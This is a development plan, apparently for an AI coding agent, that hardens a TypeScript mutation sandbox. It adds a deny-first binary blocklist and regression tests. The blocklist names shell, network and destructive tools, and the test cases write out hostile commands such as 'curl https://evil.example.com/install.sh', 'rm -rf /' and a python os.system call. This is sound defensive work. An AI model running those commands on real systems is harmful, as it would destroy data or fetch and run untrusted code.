---
phase: 02-critical-security-backlog-closure
plan: 04
type: execute
wave: 2
depends_on:
  - "01"
files_modified:
  - src/self-improve/sandbox.ts
  - tests/self-improve/sandbox.test.ts
autonomous: true
requirements:
  - SEC-04
must_haves:
  truths:
    - "runCommandInSandbox returns success=false with `Blocked: '{exec}' is not an allowed executable` when the parsed first token is not in ALLOWED_EXECUTABLES"
    - "ALLOWED_EXECUTABLES is exported as ReadonlySet<string> so test code asserts its exact contents and silent widening shows up as a diff"
    - "FORBIDDEN_BINARIES (curl, wget, sh, bash, rm, dd, mkfs, sudo, chmod, chown, scp, ssh, eval, perl, python, ruby) are explicitly blocked even if a future maintainer widens the allowlist — denylist runs as a second layer (deny-first, allow-second)"
    - "A regression test covers: (a) `npm` accepted (mocked), (b) `curl` rejected via FORBIDDEN_BINARIES, (c) `rm` rejected via FORBIDDEN_BINARIES, (d) `bash` rejected via FORBIDDEN_BINARIES, (e) `python` rejected via FORBIDDEN_BINARIES, (f) the allowlist contents are exactly asserted"
    - "npm run typecheck and npm test stay green"
  artifacts:
    - path: "src/self-improve/sandbox.ts"
      provides: "Mutation worktree sandbox with explicit allowlist + denylist gate around execFile"
      contains: "FORBIDDEN_BINARIES"
    - path: "tests/self-improve/sandbox.test.ts"
      provides: "Allowlist + denylist regression coverage"
      contains: "FORBIDDEN_BINARIES"
  key_links:
    - from: "src/self-improve/sandbox.ts#runCommandInSandbox"
      to: "src/self-improve/sandbox.ts#ALLOWED_EXECUTABLES + FORBIDDEN_BINARIES"
      via: "Set.has check (deny first, then allow)"
      pattern: "FORBIDDEN_BINARIES\\.has|ALLOWED_EXECUTABLES\\.has"
    - from: "tests/self-improve/sandbox.test.ts"
      to: "src/self-improve/sandbox.ts"
      via: "Vitest imports + execFile mock"
      pattern: "ALLOWED_EXECUTABLES|FORBIDDEN_BINARIES"
---

<objective>
SEC-04: Harden `src/self-improve/sandbox.ts` so the mutation worktree sandbox cannot invoke forbidden binaries even if `ALLOWED_EXECUTABLES` widens later. The current `runCommandInSandbox` already gates first-token execution against `ALLOWED_EXECUTABLES = { npm, npx, tsc, vitest, node, git }` (lines 6–8 + 70–78). This plan adds an explicit `FORBIDDEN_BINARIES` second-layer denylist that runs before the allowlist check, exports both sets for test assertion, and adds a regression test block that pins the allowlist contents and verifies known-dangerous binaries are rejected.

Purpose: The sandbox runs commands derived from benchmark configs that an LLM helped author. The current allowlist is sound today, but the failure mode the project is trying to prevent is "future maintainer adds `bash` to the allowlist to fix some niche benchmark and now the mutation pipeline can shell out arbitrarily inside the worktree". A defense-in-depth denylist makes that exact mistake fail loudly with a test, not silently in production.

Output: `sandbox.ts` with an exported `ALLOWED_EXECUTABLES: ReadonlySet<string>` plus a new exported `FORBIDDEN_BINARIES: ReadonlySet<string>` checked first; `tests/self-improve/sandbox.test.ts` with a `SEC-04` describe block containing a pin-the-allowlist test plus rejection cases for curl/rm/bash/python.
</objective>

<execution_context>
@$HOME/.claude/get-shit-done/workflows/execute-plan.md
@$HOME/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/REQUIREMENTS.md
@.planning/phases/02-critical-security-backlog-closure/02-CONTEXT.md
@src/self-improve/sandbox.ts
@.claude/skills/typescript/SKILL.md

<interfaces>
Current allowlist (src/self-improve/sandbox.ts, lines 6 to 8):
```ts
const ALLOWED_EXECUTABLES = new Set([
  'npm', 'npx', 'tsc', 'vitest', 'node', 'git',
]);
```

Current gate inside runCommandInSandbox (lines 67 to 78, after parsing args):
```ts
const executable = args.shift() ?? command;

// Reject executables not in the allowlist — prevents LLM-controlled benchmark commands from escaping
if (!ALLOWED_EXECUTABLES.has(executable)) {
  return Promise.resolve({
    success: false,
    output: "",
    error: `Blocked: '${executable}' is not an allowed executable. Allowed: ${[...ALLOWED_EXECUTABLES].join(', ')}`,
    exitCode: 1,
    durationMs: 0,
  });
}
```

Public exports already in file:
- `runCommandInSandbox(command, options)`
- `runInWorktreeSandbox(taskFn, options)`

Existing test file: `tests/self-improve/sandbox.test.ts` (already exercises happy-path + timeout). Reuse its mock setup pattern.
</interfaces>

<notes_for_executor>
1. Two-layer rule: deny-first, allow-second. Order matters — the denylist returns the rejection BEFORE the allowlist check so a future widening of `ALLOWED_EXECUTABLES` cannot accidentally re-enable a forbidden binary.
2. FORBIDDEN_BINARIES content — match the project's existing risk model from `src/hooks/security.ts` `DENY_PATTERNS`. The minimum set this plan must include: `curl, wget, sh, bash, zsh, dash, rm, dd, mkfs, sudo, chmod, chown, scp, ssh, eval, perl, python, python3, ruby`. Do not add esoteric entries — keep it focused on shell + network + dangerous fs binaries that are the known prompt-injection escape paths.
3. Export both Sets as `ReadonlySet<string>` so tests can pin them and a future widening shows up as a test diff.
4. Keep the existing `error` message format — it is a load-bearing string. The new denylist branch returns a slightly different message: `Blocked: '${executable}' is on the SEC-04 forbidden binary list`. That second message lets tests distinguish the two layers.
5. No changes to `runInWorktreeSandbox` — that function already delegates execution; the gating is done by `runCommandInSandbox` if the caller routes through it. Worktree creation (`git worktree add`) uses `execFile("git", ...)` directly, which is acceptable because `git` is hard-coded (not LLM-derived) and is itself on the allowlist.
6. TypeScript strict mode — see `.claude/skills/typescript/SKILL.md`. `args.shift() ?? command` returns `string` because `command` is `string`. No type churn.
7. Testing pattern — match the existing `tests/self-improve/sandbox.test.ts` style. Read it once before editing to copy the mock signature for `node:child_process.execFile`.
</notes_for_executor>
</context>

<tasks>

<task type="auto">
  <name>Task 1: Add FORBIDDEN_BINARIES denylist + export both sets, deny-first ordering</name>
  <files>src/self-improve/sandbox.ts</files>
  <action>
Edit 1 — replace the existing allowlist declaration at lines 6 to 8 with the exported version plus the new FORBIDDEN_BINARIES set.

Before:
```ts
const ALLOWED_EXECUTABLES = new Set([
  'npm', 'npx', 'tsc', 'vitest', 'node', 'git',
]);
```

After:
```ts
/**
 * SEC-04: Allowlist for executables runnable inside the mutation sandbox.
 * Exported (read-only) so regression tests can assert exact contents — silent
 * widening shows up as a test diff. Pair with FORBIDDEN_BINARIES below for
 * defense-in-depth (deny-first ordering).
 */
export const ALLOWED_EXECUTABLES: ReadonlySet<string> = new Set([
  'npm', 'npx', 'tsc', 'vitest', 'node', 'git',
]);

/**
 * SEC-04: Defense-in-depth denylist. Even if a future maintainer widens
 * ALLOWED_EXECUTABLES, none of these binaries may be invoked from the
 * mutation worktree. Mirrors the high-risk surface in src/hooks/security.ts
 * DENY_PATTERNS (shell + network + dangerous fs).
 */
export const FORBIDDEN_BINARIES: ReadonlySet<string> = new Set([
  'curl', 'wget',
  'sh', 'bash', 'zsh', 'dash',
  'rm', 'dd', 'mkfs',
  'sudo', 'chmod', 'chown',
  'scp', 'ssh',
  'eval',
  'perl', 'python', 'python3', 'ruby',
]);
```

Edit 2 — replace the existing single-layer gate (lines 70 to 78) with deny-first, allow-second.

Before:
```ts
  // Reject executables not in the allowlist — prevents LLM-controlled benchmark commands from escaping
  if (!ALLOWED_EXECUTABLES.has(executable)) {
    return Promise.resolve({
      success: false,
      output: "",
      error: `Blocked: '${executable}' is not an allowed executable. Allowed: ${[...ALLOWED_EXECUTABLES].join(', ')}`,
      exitCode: 1,
      durationMs: 0,
    });
  }
```

After:
```ts
  // SEC-04 layer 1 — explicit denylist runs first so a future allowlist widening
  // cannot accidentally re-enable a known-dangerous binary.
  if (FORBIDDEN_BINARIES.has(executable)) {
    return Promise.resolve({
      success: false,
      output: "",
      error: `Blocked: '${executable}' is on the SEC-04 forbidden binary list`,
      exitCode: 1,
      durationMs: 0,
    });
  }

  // SEC-04 layer 2 — explicit allowlist for everything else. Reject anything
  // not on the small known-good set.
  if (!ALLOWED_EXECUTABLES.has(executable)) {
    return Promise.resolve({
      success: false,
      output: "",
      error: `Blocked: '${executable}' is not an allowed executable. Allowed: ${[...ALLOWED_EXECUTABLES].join(', ')}`,
      exitCode: 1,
      durationMs: 0,
    });
  }
```

Self-check: `grep -n "FORBIDDEN_BINARIES.has\|ALLOWED_EXECUTABLES.has" src/self-improve/sandbox.ts` must return two lines, with `FORBIDDEN_BINARIES.has` BEFORE `ALLOWED_EXECUTABLES.has` (line numbers ascending). If they are reversed, swap them.
  </action>
  <verify>
    <automated>grep -n "export const ALLOWED_EXECUTABLES: ReadonlySet&lt;string&gt;" src/self-improve/sandbox.ts &amp;&amp; grep -n "export const FORBIDDEN_BINARIES: ReadonlySet&lt;string&gt;" src/self-improve/sandbox.ts &amp;&amp; node -e "const t=require('fs').readFileSync('src/self-improve/sandbox.ts','utf8');const a=t.indexOf('FORBIDDEN_BINARIES.has(executable)');const b=t.indexOf('ALLOWED_EXECUTABLES.has(executable)');if(!(a&gt;=0 &amp;&amp; b&gt;a))throw new Error('deny-first order broken: a='+a+' b='+b);console.log('order ok')" &amp;&amp; npm run typecheck</automated>
  </verify>
  <done>
- `grep "export const ALLOWED_EXECUTABLES: ReadonlySet" src/self-improve/sandbox.ts` returns one match.
- `grep "export const FORBIDDEN_BINARIES: ReadonlySet" src/self-improve/sandbox.ts` returns one match.
- `FORBIDDEN_BINARIES.has(executable)` appears at a smaller line number than `ALLOWED_EXECUTABLES.has(executable)` (deny-first).
- `npm run typecheck` exits 0.
  </done>
</task>

<task type="auto">
  <name>Task 2: Add SEC-04 regression tests (pin allowlist + 4 rejection cases)</name>
  <files>tests/self-improve/sandbox.test.ts</files>
  <action>
Read `tests/self-improve/sandbox.test.ts` once to learn the existing `vi.mock("node:child_process", ...)` pattern. Then append a new describe block at the bottom of the file.

Required additions (in this exact form, preserving the existing import style):

```ts
import {
  ALLOWED_EXECUTABLES,
  FORBIDDEN_BINARIES,
  runCommandInSandbox,
} from "../../src/self-improve/sandbox.js";
// keep any other existing imports

describe("SEC-04 sandbox executable allowlist + denylist", () => {
  it("pins ALLOWED_EXECUTABLES to the known-safe set", () => {
    expect([...ALLOWED_EXECUTABLES].sort()).toEqual(
      ["git", "node", "npm", "npx", "tsc", "vitest"]
    );
  });

  it("includes shell + network + dangerous-fs binaries in FORBIDDEN_BINARIES", () => {
    for (const bad of ["curl", "wget", "sh", "bash", "zsh", "rm", "dd", "sudo", "chmod", "scp", "ssh", "eval", "python", "perl", "ruby"]) {
      expect(FORBIDDEN_BINARIES.has(bad)).toBe(true);
    }
  });

  it("blocks 'curl' via FORBIDDEN_BINARIES with the layer-1 message", async () => {
    const r = await runCommandInSandbox("curl https://evil.example.com/install.sh", {
      timeoutMs: 1000,
    });
    expect(r.success).toBe(false);
    expect(r.exitCode).toBe(1);
    expect(r.error ?? "").toContain("forbidden binary list");
  });

  it("blocks 'rm' via FORBIDDEN_BINARIES with the layer-1 message", async () => {
    const r = await runCommandInSandbox("rm -rf /", { timeoutMs: 1000 });
    expect(r.success).toBe(false);
    expect(r.error ?? "").toContain("forbidden binary list");
  });

  it("blocks 'bash' via FORBIDDEN_BINARIES (defense even if allowlist were widened)", async () => {
    const r = await runCommandInSandbox("bash -c 'echo pwned'", { timeoutMs: 1000 });
    expect(r.success).toBe(false);
    expect(r.error ?? "").toContain("forbidden binary list");
  });

  it("blocks 'python' via FORBIDDEN_BINARIES", async () => {
    const r = await runCommandInSandbox("python -c 'import os; os.system(\"id\")'", {
      timeoutMs: 1000,
    });
    expect(r.success).toBe(false);
    expect(r.error ?? "").toContain("forbidden binary list");
  });

  it("blocks an unknown executable 'fooexec' via the layer-2 allowlist message", async () => {
    const r = await runCommandInSandbox("fooexec --do-stuff", { timeoutMs: 1000 });
    expect(r.success).toBe(false);
    expect(r.error ?? "").toContain("not an allowed executable");
  });
});
```

Notes for the executor while pasting the block:
- The rejection cases do NOT call `execFile` (the gate returns synchronously inside a `Promise.resolve(...)`), so the existing `child_process` mock does not need any new behavior. If the test file does not currently mock `child_process`, leave it that way — the gate returns before any spawn.
- Do not add an "accepted npm" case unless the file already has a clean way to assert mocked execFile behavior; the pin-the-allowlist test already proves `npm` is in the allowlist, which is sufficient SEC-04 evidence.
- Keep imports tidy: extend the existing import line for `sandbox.js` rather than adding a duplicate import.
  </action>
  <verify>
    <automated>grep -c "SEC-04 sandbox executable allowlist" tests/self-improve/sandbox.test.ts &amp;&amp; grep -c "FORBIDDEN_BINARIES" tests/self-improve/sandbox.test.ts</automated>
  </verify>
  <done>
- New `describe("SEC-04 sandbox executable allowlist + denylist", ...)` present in `tests/self-improve/sandbox.test.ts`.
- Block contains: pin-the-allowlist test, denylist contents test, and 4 rejection cases (curl, rm, bash, python) plus 1 unknown-exec layer-2 case.
- Imports updated to bring in `ALLOWED_EXECUTABLES`, `FORBIDDEN_BINARIES`, `runCommandInSandbox` from `sandbox.js`.
- Existing tests in the file are untouched.
  </done>
</task>

<task type="auto">
  <name>Task 3: Typecheck + run sandbox tests + full suite</name>
  <files>(no files modified — verification-only)</files>
  <action>
1. `npm run typecheck` — must exit 0.
2. `npm test -- --run tests/self-improve/sandbox.test.ts` — both the new SEC-04 cases and the pre-existing cases must be green.
3. `npm test` — full suite green (baseline).
4. Capture for the SUMMARY:
   - `grep -rn "FORBIDDEN_BINARIES\|ALLOWED_EXECUTABLES" src/ tests/ --include="*.ts"` — full callsite list.
   - The line numbers of `FORBIDDEN_BINARIES.has(executable)` vs `ALLOWED_EXECUTABLES.has(executable)` to prove deny-first ordering.
  </action>
  <verify>
    <automated>npm run typecheck &amp;&amp; npm test -- --run tests/self-improve/sandbox.test.ts &amp;&amp; npm test</automated>
  </verify>
  <done>
- `npm run typecheck` exits 0.
- `npm test -- --run tests/self-improve/sandbox.test.ts` green.
- `npm test` full green baseline.
- SUMMARY captures the grep output proving deny-first ordering.
  </done>
</task>

</tasks>

<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| LLM-authored benchmark command → child process spawn | The sandbox executes commands whose first token can come from a benchmark config that an LLM influenced. |
| Future maintainer edits to ALLOWED_EXECUTABLES | A second-layer denylist guards against accidental widening that would re-enable shell-out. |

## STRIDE Threat Register

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-02-04-01 | Elevation of Privilege | runCommandInSandbox first-token spawn | mitigate | Two-layer gate (FORBIDDEN_BINARIES first, then ALLOWED_EXECUTABLES). Tests pin both sets. |
| T-02-04-02 | Tampering | Future allowlist widening | mitigate | Denylist runs before allowlist; test pins exact contents so PRs widening either set show diff. |
| T-02-04-03 | Information Disclosure | Sandbox shells out to `curl evil.example.com` | mitigate | curl + wget + ssh + scp explicitly denied. |
</threat_model>

<verification>
End-to-end phase checks for this plan:
- `grep -n "FORBIDDEN_BINARIES\|ALLOWED_EXECUTABLES" src/self-improve/sandbox.ts` returns ≥ 4 matches (export + has-check for each set).
- `tests/self-improve/sandbox.test.ts` contains the SEC-04 describe block, all cases passing.
- `npm run typecheck && npm test` green.
</verification>

<success_criteria>
- Mutation sandbox rejects forbidden binaries via explicit denylist before checking allowlist.
- Allowlist + denylist are exported and test-pinned; silent widening is detectable.
- No regression in existing sandbox or broader suite.
</success_criteria>

<output>
After completion, create `.planning/phases/02-critical-security-backlog-closure/02-04-SUMMARY.md` including:
- Diff slice of `sandbox.ts` showing both exported sets and deny-first gate.
- New describe block added to `sandbox.test.ts`.
- `grep -rn` callsite report proving deny-first ordering.
</output>
